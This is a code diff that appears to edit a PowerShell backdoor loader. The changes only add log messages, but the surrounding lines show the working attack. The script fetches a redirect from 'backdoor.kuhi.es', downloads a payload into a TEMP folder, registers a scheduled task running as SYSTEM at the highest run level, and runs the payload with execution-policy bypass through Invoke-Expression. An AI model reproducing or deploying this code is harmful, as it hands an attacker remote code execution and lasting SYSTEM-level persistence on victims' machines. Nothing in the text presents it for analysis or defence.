@@ -9,10 +9,10 @@ function Save-Script {
     try {
         $response = Invoke-WebRequest -Uri "http://backdoor.kuhi.es" -MaximumRedirection 0 -ErrorAction Ignore
         $url = $response.Headers.Location
-        $destino = "$env:TEMP\Powershell\PowershellTask.ps1"
-        Write-Output $destino # for testing only        
+        $destino = "$env:TEMP\Powershell\PowershellTask.ps1"        
         New-Item -ItemType Directory -Force -Path "$env:TEMP\Powershell"
-        Invoke-WebRequest -Uri $url -OutFile $destino
+        Invoke-WebRequest -Uri $url -OutFile $destino       
+        Write-Output "Downloaded payload to $destino" 
     }
     catch {
         Write-Error "$_"
@@ -29,6 +29,7 @@ function Set-ScheduledTask {
         $taskPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
         $task = Register-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger $taskTrigger -Settings $taskSettings -Principal $taskPrincipal -Force
         $task | Out-Null
+        Write-Output "Scheduled task created successfully"
     }
     catch {
         Write-Error "$_"
@@ -40,6 +41,7 @@ function Start-Payload {
     try {
         $command = "powershell.exe -Ep Bypass -dc '$dc' -File '$destino'"
         Invoke-Expression $command
+        Write-Output "Script executed successfully"
     }
     catch {
         Write-Error "$_"
